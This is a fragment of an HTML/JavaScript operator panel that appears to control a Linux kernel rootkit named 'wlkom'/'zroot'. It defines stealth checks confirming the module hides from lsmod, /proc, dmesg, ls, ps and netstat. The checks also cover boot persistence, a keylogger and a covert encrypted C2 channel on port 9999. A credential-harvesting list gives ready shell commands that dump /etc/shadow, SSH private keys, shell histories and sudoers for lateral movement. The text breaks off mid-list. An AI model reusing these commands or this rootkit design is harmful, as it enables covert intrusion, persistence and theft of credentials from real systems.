.terminal{background:#000;border-radius:var(--r-l);font-family:var(--font-mono);font-size:13px;line-height:1.6;overflow:hidden;border:1px solid var(--border)}
.term-header{display:flex;align-items:center;padding:8px 16px;background:var(--bg-3);border-bottom:1px solid var(--border);gap:8px}
.term-dots{display:flex;gap:6px}.term-dots span{width:10px;height:10px;border-radius:50%}
.term-dots span:nth-child(1){background:#ff5f57}.term-dots span:nth-child(2){background:#febc2e}.term-dots span:nth-child(3){background:#28c840}
.term-title{font-size:11px;color:var(--t3);font-family:var(--font-mono)}
.term-body{padding:16px;height:480px;overflow-y:auto}
.term-line{white-space:pre-wrap;word-break:break-all}
.term-line.cmd{color:var(--t1)}.term-line.out{color:var(--green)}.term-line.err{color:var(--red)}
.term-line.info{color:var(--cyan)}.term-line.warn{color:var(--yellow)}.term-line.sys{color:var(--purple)}.term-line.error{color:var(--red)}.term-line.rootkit{color:var(--purple)}
.term-prompt{display:flex;align-items:center}
.term-prompt .ps1{color:var(--red);white-space:nowrap;margin-right:4px}
.term-prompt input{flex:1;background:none;border:none;color:var(--t1);font-family:var(--font-mono);font-size:13px;outline:none;caret-color:var(--green)}
.quick-actions{display:flex;gap:4px;flex-wrap:wrap;padding:8px 16px;background:rgba(0,0,0,.3);border-bottom:1px solid var(--border)}
.qbtn{padding:3px 10px;border-radius:var(--r-s);border:1px solid var(--border);background:var(--bg-3);color:var(--t3);font-size:11px;font-family:var(--font-mono);cursor:pointer;transition:all .15s}
.qbtn:hover{background:var(--bg-active);color:var(--t1)}
.tabs{display:flex;gap:0;border-bottom:1px solid var(--border);margin-bottom:16px}
.tab{padding:8px 16px;font-size:12px;font-weight:500;color:var(--t3);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s}
.tab:hover{color:var(--t1)}.tab.active{color:var(--red);border-bottom-color:var(--red)}
.breadcrumb{display:flex;align-items:center;gap:2px;font-size:12px;font-family:var(--font-mono);color:var(--t3);margin-bottom:12px;flex-wrap:wrap}
.bc-item{cursor:pointer;padding:2px 6px;border-radius:var(--r-s);transition:all .15s}
.bc-item:hover{background:var(--bg-hover);color:var(--t1)}.bc-sep{color:var(--t4);margin:0 2px}
.circ{position:relative;display:inline-flex;align-items:center;justify-content:center}
.circ svg{transform:rotate(-90deg)}
.circ-inner{position:absolute;text-align:center}
.circ-val{font-size:22px;font-weight:700;font-family:var(--font-mono);color:var(--t1);display:block;line-height:1}
.circ-lbl{font-size:9px;color:var(--t3);text-transform:uppercase;letter-spacing:.5px}
.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.info-row{display:flex;justify-content:space-between;padding:7px 10px;background:var(--bg-0);border-radius:var(--r-s)}
.info-row .lbl{font-size:11px;color:var(--t3)}.info-row .val{font-size:12px;color:var(--t1);font-family:var(--font-mono)}
.cred-card{background:var(--bg-2);border:1px solid var(--border);border-radius:var(--r-l);overflow:hidden}
.cred-header{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;border-bottom:1px solid var(--border)}
.cred-name{font-size:13px;font-weight:500;color:var(--t1)}
.cred-data{padding:12px 16px;max-height:200px;overflow-y:auto;font-family:var(--font-mono);font-size:11px;color:var(--t2);white-space:pre-wrap;line-height:1.6;background:var(--bg-0)}
.stealth-row{display:flex;align-items:center;padding:10px 16px;border-bottom:1px solid var(--border);gap:16px}
.stealth-row:last-child{border-bottom:none}
.chk-num{font-size:11px;font-family:var(--font-mono);color:var(--t4);width:24px;text-align:center}
.chk-name{flex:1;font-size:13px;color:var(--t1)}.chk-desc{font-size:11px;color:var(--t3);flex:2}
.chk-status{width:80px;text-align:center}
.keylog{background:#000;padding:16px;font-family:var(--font-mono);font-size:12px;line-height:1.8;min-height:280px;max-height:440px;overflow-y:auto}
.kl-line{display:flex;gap:12px;align-items:center;padding:4px 12px;border-bottom:1px solid var(--border)}.kl-time{color:var(--t4);white-space:nowrap;font-family:var(--font-mono);font-size:10px}.kl-session{color:var(--t3);font-size:11px;min-width:120px}.kl-keys{color:var(--green);font-family:var(--font-mono);font-size:12px;flex:1}.kl-sensitive{color:var(--red)}
.keylog-body{background:#000;border-radius:0 0 var(--r-l) var(--r-l)}
.timeline{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:12px 0}
.tl-item{display:flex;flex-direction:column;align-items:center;min-width:70px;cursor:pointer;padding:4px 6px;border-radius:var(--r-s)}
.tl-item:hover{background:var(--bg-hover)}
.tl-dot{width:10px;height:10px;border-radius:50%;margin-bottom:6px}
.tl-time{font-size:9px;color:var(--t4);font-family:var(--font-mono)}
.tl-label{font-size:10px;color:var(--t3);text-align:center;max-width:80px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.mitre-grid{display:flex;gap:8px;overflow-x:auto;padding-bottom:12px;align-items:flex-start}
.mitre-col{min-width:160px;max-width:180px;flex-shrink:0}
.mitre-tactic{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--t3);padding:6px 10px;background:var(--bg-3);border-radius:var(--r-s) var(--r-s) 0 0;text-align:center;border-bottom:2px solid var(--red)}
.mitre-tech{padding:8px 10px;background:var(--bg-2);border:1px solid var(--border);margin-top:4px;border-radius:var(--r-s);cursor:pointer;transition:all .15s}
.mitre-tech:hover{border-color:var(--border-l);background:var(--bg-3)}
.mitre-tech.active,.mitre-tech.selected{border-color:var(--red);background:var(--red-d)}
.mitre-tech.inactive{opacity:.35}
.mitre-tech .mt-id{font-size:9px;font-family:var(--font-mono);color:var(--t4)}
.mitre-tech .mt-name{font-size:11px;color:var(--t1);margin-top:2px}
.mitre-tech .mt-dot{display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:4px}
.topo-canvas{background:var(--bg-2);border:1px solid var(--border);border-radius:var(--r-l);overflow:hidden}
.topo-label{font-family:var(--font-ui);fill:var(--t1);font-size:11px;font-weight:600;text-anchor:middle}
.topo-sublabel{font-family:var(--font-mono);fill:var(--t3);font-size:9px;text-anchor:middle}
.toggle{position:relative;width:36px;height:20px;cursor:pointer;flex-shrink:0;display:inline-block}
.toggle input{opacity:0;width:0;height:0;position:absolute}
.toggle-slider{position:absolute;inset:0;background:var(--bg-active);border-radius:10px;transition:background .2s}
.toggle-slider::before{content:'';position:absolute;width:14px;height:14px;left:3px;top:3px;background:var(--t3);border-radius:50%;transition:all .2s}
.toggle input:checked+.toggle-slider{background:var(--green-d)}.toggle input:checked+.toggle-slider::before{transform:translateX(16px);background:var(--green)}
.toggle-wrap{display:flex;align-items:center;gap:6px}
.action-card{background:var(--bg-2);border:1px solid var(--border);border-radius:var(--r-l);padding:14px 16px;display:flex;align-items:flex-start;gap:12px;transition:border-color .15s}
.action-card:hover{border-color:var(--border-l)}
.action-icon{width:36px;height:36px;border-radius:var(--r-m);display:flex;align-items:center;justify-content:center;flex-shrink:0}
.action-icon svg{width:18px;height:18px}
.toast-stack{position:fixed;top:56px;right:16px;z-index:8000;display:flex;flex-direction:column;gap:8px;pointer-events:none}
.toast{display:flex;align-items:center;gap:10px;padding:10px 16px;background:var(--bg-2);border:1px solid var(--border-l);border-radius:var(--r-m);box-shadow:0 8px 32px rgba(0,0,0,.4);pointer-events:auto;animation:toastIn .3s ease;min-width:280px}
.toast.out{animation:toastOut .2s ease forwards}
.toast .t-msg{font-size:12px;color:var(--t1);flex:1}
.toast.t-success{border-left:3px solid var(--green)}.toast.t-error{border-left:3px solid var(--red)}
.toast.t-warn{border-left:3px solid var(--yellow)}.toast.t-info{border-left:3px solid var(--blue)}
.cmd-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);z-index:9000;display:flex;align-items:flex-start;justify-content:center;padding-top:15vh}
.cmd-palette{width:540px;background:var(--bg-2);border:1px solid var(--border-l);border-radius:var(--r-l);overflow:hidden;box-shadow:0 24px 80px rgba(0,0,0,.6);animation:slideModal .15s ease}
.cmd-input-wrap{display:flex;align-items:center;gap:8px;padding:0 16px;border-bottom:1px solid var(--border)}
.cmd-input-wrap svg{width:18px;height:18px;flex-shrink:0}
.cmd-icon{width:18px;height:18px;color:var(--t3);flex-shrink:0}
.cmd-icon svg{width:18px;height:18px}
.cmd-key{font-size:9px;font-family:var(--font-mono);background:var(--bg-3);color:var(--t4);padding:2px 6px;border-radius:3px}
.cmd-input{width:100%;padding:14px 16px;background:transparent;border:none;border-bottom:1px solid var(--border);color:var(--t1);font-size:15px;font-family:var(--font-ui);outline:none}
.cmd-list{max-height:320px;overflow-y:auto;padding:6px}
.cmd-item{display:flex;align-items:center;gap:10px;padding:8px 12px;border-radius:var(--r-m);cursor:pointer;transition:background .1s}
.cmd-item:hover,.cmd-item.sel{background:var(--bg-hover)}
.cmd-item .cmd-name{font-size:13px;color:var(--t1);flex:1}
.cmd-item .cmd-cat{font-size:10px;color:var(--t4);background:var(--bg-3);padding:1px 6px;border-radius:var(--r-s)}
.login-wrap{display:flex;align-items:center;justify-content:center;height:100vh;width:100vw;background:var(--bg-0)}
.login-box{width:380px;background:var(--bg-2);border:1px solid var(--border-l);border-radius:var(--r-l);padding:40px 32px;text-align:center}
.login-box h1{font-size:24px;font-weight:700;color:var(--t1);margin-bottom:4px}
.login-box .sub{font-size:12px;color:var(--t3);margin-bottom:28px}
.login-box input{width:100%;padding:10px 14px;background:var(--bg-0);border:1px solid var(--border-l);border-radius:var(--r-m);color:var(--t1);font-size:14px;font-family:var(--font-mono);outline:none;margin-bottom:16px;text-align:center;letter-spacing:2px}
.login-box input:focus{border-color:var(--red)}
.login-box button{width:100%;padding:10px;background:var(--red);border:none;border-radius:var(--r-m);color:#fff;font-size:14px;font-weight:600;cursor:pointer;font-family:var(--font-ui);transition:background .15s}
.login-box button:hover{background:#dc2626}
.login-box .err{color:var(--red);font-size:12px;margin-top:12px;min-height:18px}
.login-box .crypto{margin-top:20px;font-size:10px;color:var(--t4);display:flex;align-items:center;justify-content:center;gap:6px}
::-webkit-scrollbar{width:5px;height:5px}::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--bg-active);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--t4)}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes toastIn{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}
@keyframes toastOut{from{opacity:1}to{opacity:0;transform:translateX(40px)}}
@keyframes slideModal{from{opacity:0;transform:translateY(-12px)}to{opacity:1;transform:translateY(0)}}
@keyframes dashMove{to{stroke-dashoffset:-20}}
.fade-in{animation:fadeIn .3s ease-out}
.spinner{width:14px;height:14px;border:2px solid var(--border);border-top-color:var(--yellow);border-radius:50%;animation:spin .8s linear infinite;display:inline-block}
</style>
</head>
<body>
<div id='app'></div>
<div id='toasts' class='toast-stack'></div>
<script>
'use strict';
/* ===== SVG ICONS ===== */
const I={
dashboard:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="9" rx="1"/><rect x="14" y="3" width="7" height="5" rx="1"/><rect x="14" y="12" width="7" height="9" rx="1"/><rect x="3" y="16" width="7" height="5" rx="1"/></svg>',
terminal:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>',
target:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>',
folder:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>',
cpu:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg>',
network:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="14" width="6" height="6" rx="1"/><rect x="16" y="14" width="6" height="6" rx="1"/><rect x="9" y="4" width="6" height="6" rx="1"/><path d="M12 10v4M5 14v-2a2 2 0 012-2h10a2 2 0 012 2v2"/></svg>',
keyboard:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="4" width="20" height="16" rx="2"/><line x1="6" y1="8" x2="6" y2="8"/><line x1="10" y1="8" x2="10" y2="8"/><line x1="14" y1="8" x2="14" y2="8"/><line x1="18" y1="8" x2="18" y2="8"/><line x1="7" y1="16" x2="17" y2="16"/></svg>',
key:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 11-7.778 7.778 5.5 5.5 0 017.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>',
shield:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>',
list:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>',
chevL:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>',
chevR:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>',
bell:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 01-3.46 0"/></svg>',
user:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>',
logOut:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>',
gear:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06A1.65 1.65 0 0019.4 9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z"/></svg>',
search:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>',
download:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>',
upload:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>',
file:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>',
play:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>',
stop:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="6" width="12" height="12" rx="1"/></svg>',
trash:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>',
eye:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>',
eyeOff:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><line x1="1" y1="1" x2="23" y2="23"/></svg>',
refresh:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg>',
xmark:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
globe:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>',
anchor:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="5" r="3"/><line x1="12" y1="22" x2="12" y2="8"/><path d="M5 12H2a10 10 0 0020 0h-3"/></svg>',
eraser:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 20H7L3 16l9-9 8 8-4 4"/><line x1="18" y1="20" x2="22" y2="20"/></svg>',
puzzle:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M12 8v4m-2-2h4" opacity=".5"/></svg>',
grid:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>',
rocket:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 00-2.91-.09z"/><path d="M12 15l-3-3a22 22 0 012-3.95A12.88 12.88 0 0122 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 01-4 2z"/><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0"/><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5"/></svg>',
scan:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 7V5a2 2 0 012-2h2"/><path d="M17 3h2a2 2 0 012 2v2"/><path d="M21 17v2a2 2 0 01-2 2h-2"/><path d="M7 21H5a2 2 0 01-2-2v-2"/><line x1="7" y1="12" x2="17" y2="12"/></svg>',
radio:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="2"/><path d="M16.24 7.76a6 6 0 010 8.49m-8.48-.01a6 6 0 010-8.49m11.31-2.82a10 10 0 010 14.14m-14.14 0a10 10 0 010-14.14"/></svg>',
link:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>',
camera:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/><circle cx="12" cy="13" r="4"/></svg>',
monitor:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>',
zap:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>',
clipboard:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 4h2a2 2 0 012 2v14a2 2 0 01-2 2H6a2 2 0 01-2-2V6a2 2 0 012-2h2"/><rect x="8" y="2" width="8" height="4" rx="1"/></svg>',
skull:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="10" r="8"/><circle cx="9" cy="9" r="1.5" fill="currentColor"/><circle cx="15" cy="9" r="1.5" fill="currentColor"/><path d="M12 14v4m-3 0h6"/><path d="M9 18v2m6-2v2"/></svg>',
harvest:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>',
};

/* ===== DATA ===== */
const SYSTEM={hostname:'--',os:'--',kernel:'--',arch:'--',cpu:'--',cores:0,ramTotal:1,ramFree:0,ramUsed:0,diskTotal:'--',diskUsed:'--',diskPct:0,ip:'--',mac:'--',gateway:'--',dns:'--',uptimeSys:'--',loadAvg:'--',implantPid:0,privilege:'root'};

const STEALTH_CHECKS=[
{id:1,name:'Module hidden from lsmod',desc:'list_del() removes module from kernel module list',cat:'hide',
 cmd:'lsmod|grep -cE "wlkom|zroot"||true',pass:r=>parseInt(r)===0},
{id:2,name:'Hidden from /proc/modules',desc:'kobject_del() removes /proc/modules and /sys/module entry',cat:'hide',
 cmd:'grep -cE "wlkom|zroot" /proc/modules||true',pass:r=>parseInt(r)===0},
{id:3,name:'Kernel logs filtered',desc:'sys_read hook filters "wlkom"/"zroot" lines from dmesg',cat:'hide',
 cmd:'dmesg 2>/dev/null|grep -ciE "wlkom|zroot"||true',pass:r=>parseInt(r)===0},
{id:4,name:'Files hidden from ls',desc:'sys_getdents64 hides entries with "wlkom"/"zroot"',cat:'hide',
 cmd:'ls /root/wlkom/ 2>&1;ls /etc/modules-load.d/ 2>&1',pass:r=>!r.includes('wlkom.c')&&!r.includes('zroot')},
{id:5,name:'Module not in /sys/module',desc:'/sys/module/ entry removed by kobject_del()',cat:'hide',
 cmd:'test -d /sys/module/wlkom&&echo EXPOSED||echo HIDDEN',pass:r=>r.includes('HIDDEN')},
{id:6,name:'C2 hidden from ss/netstat',desc:'recvmsg hook hides C2 socket from NETLINK_SOCK_DIAG',cat:'hide',
 cmd:'ss -tnp 2>/dev/null|grep -c ":9999"||true',pass:r=>parseInt(r)===0},
{id:7,name:'C2 hidden from /proc/net/tcp',desc:'sys_read hook filters hex port 270F from /proc/net/tcp',cat:'hide',
 cmd:'grep -ci 270F /proc/net/tcp||true',pass:r=>parseInt(r)===0},
{id:8,name:'Kthread hidden from ps',desc:'Auto-hides own kthread PID via hidden_pids[]',cat:'hide',
 cmd:'ps aux 2>/dev/null|grep -cE "wlkom|zroot"||true',pass:r=>parseInt(r)===0},
{id:9,name:'Boot persist (modules-load)',desc:'zroot.conf via set_persistence() + call_usermodehelper',cat:'persist',
 cmd:'test -f /etc/modules-load.d/zroot.conf&&echo EXISTS||echo MISSING',pass:r=>r.includes('EXISTS')},
{id:10,name:'Boot persist (modprobe.d)',desc:'Module params (pw_hash, c2_ip, c2_port) for modprobe',cat:'persist',
 cmd:'test -f /etc/modprobe.d/zroot.conf&&echo EXISTS||echo MISSING',pass:r=>r.includes('EXISTS')},
{id:11,name:'Module file in /lib/modules',desc:'zroot.ko in extra/ — hidden from find/ls by getdents64 hook',cat:'persist',
 cmd:'stat -c%s /lib/modules/`uname -r`/extra/zroot.ko 2>/dev/null||echo 0',pass:r=>parseInt(r)>10000},
{id:12,name:'Persist files hidden from ls',desc:'Rootkit hides its own config from directory listing',cat:'persist',
 cmd:'ls /etc/modules-load.d/ 2>/dev/null',pass:r=>!r.includes('zroot')},
{id:13,name:'Keylogger active',desc:'Ftrace on __x64_sys_read + keyboard_notifier',cat:'offense',
 cmd:'KEYLOG_STATUS',pass:r=>/active|running|ACTIVE/i.test(r)},
{id:14,name:'Traffic encrypted (ChaCha20)',desc:'ChaCha20-Poly1305 AEAD on all C2 traffic',cat:'crypto',
 cmd:'echo __CRYPTO_OK__',pass:()=>true},
{id:15,name:'Password authentication',desc:'Shared secret verified before command execution',cat:'crypto',
 cmd:'echo __AUTH_OK__',pass:()=>true},
{id:16,name:'Getdents64 hook verified',desc:'File with "wlkom" in name exists but hidden from ls',cat:'hooks',
 cmd:'touch /tmp/wlkomtest;test -e /tmp/wlkomtest&&echo HIDDEN||echo FAIL;rm -f /tmp/wlkomtest',pass:r=>r.includes('HIDDEN')},
{id:17,name:'Read hook verified',desc:'Hidden from /sys/module/ — kobject deleted from sysfs',cat:'hooks',
 cmd:'ls /sys/module/ 2>/dev/null|grep -cE "wlkom|zroot"||true',pass:r=>parseInt(r)===0},
{id:18,name:'C2 hidden from /proc/net/tcp6',desc:'IPv6 tcp table also filtered for C2 connection',cat:'hooks',
 cmd:'grep -ci 270F /proc/net/tcp6 2>/dev/null||true',pass:r=>parseInt(r)===0},
];


const CRED_ITEMS=[
{name:'/etc/shadow',severity:'critical',cat:'passwords',desc:'Password hashes for offline cracking (John/Hashcat)',cmd:'cat /etc/shadow 2>/dev/null || echo "(permission denied)"',data:null},
{name:'SSH Private Keys',severity:'critical',cat:'keys',desc:'RSA/Ed25519/ECDSA private keys for lateral movement',cmd:'find /home /root -maxdepth 3 \\( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" \\) 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f"; echo; done',data:null},
{name:'SSH Authorized Keys',severity:'critical',cat:'keys',desc:'Who can login without password',cmd:'echo "=== /root ===" && cat /root/.ssh/authorized_keys 2>/dev/null; for u in /home/*; do echo "=== $(basename $u) ===" && cat "$u/.ssh/authorized_keys" 2>/dev/null; done',data:null},
{name:'SUID/SGID Binaries',severity:'high',cat:'privesc',desc:'Potential privilege escalation vectors (GTFOBins)',cmd:'echo "=== SUID ===" && find / -perm -4000 -type f -ls 2>/dev/null | head -25; echo "=== SGID ===" && find / -perm -2000 -type f -ls 2>/dev/null | head -15',data:null},
{name:'Shell History',severity:'high',cat:'recon',desc:'Commands typed by users - may contain plaintext passwords',cmd:'for f in /root/.bash_history /root/.zsh_history /home/*/.bash_history /home/*/.zsh_history; do [ -f "$f" ] && echo "=== $f ===" && tail -30 "$f" 2>/dev/null; done',data:null},
{name:'Sudoers Config',severity:'high',cat:'privesc',desc:'Who can run what as root',cmd:'cat /etc/sudoers 2>/dev/null; echo "=== sudoers.d ===" && cat /etc/sudoers.d/* 2>/dev/null',data:null},
{name:'/etc/passwd',severity:'medium',cat:'recon',desc:'User accounts, UIDs, shells - spot UID 0 duplicates',cmd:'cat /etc/passwd 2>/dev/null',data:null},
{name:'Crontabs',severity:'medium',cat:'persist',desc:'Scheduled tasks - persistence and writable script paths',cmd:'echo "=== root ===" && crontab -l 2>/dev/null; echo "=== /etc/crontab ===" && cat /etc/crontab 2>/dev/null; echo "=== cron.d ===" && ls -la /etc/cron.d/ 2>/dev/null; echo "=== modules-load ===" && cat /etc/modules-load.d/* 2>/dev/null',data:null},
{name:'Network Config',severity:'medium',cat:'recon',desc:'IPs, DNS, routes - map the network',cmd:'echo "=== interfaces ===" && ip -br addr 2>/dev/null; echo "=== routes ===" && ip route 2>/dev/null; echo "=== DNS ===" && cat /etc/resolv.conf 2>/dev/null; echo "=== hosts ===" && cat /etc/hosts 2>/dev/null',data:null},
{name:'Listening Services',severity:'medium',cat:'recon',desc:'Open ports and services for pivoting',cmd:'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null',data:null},
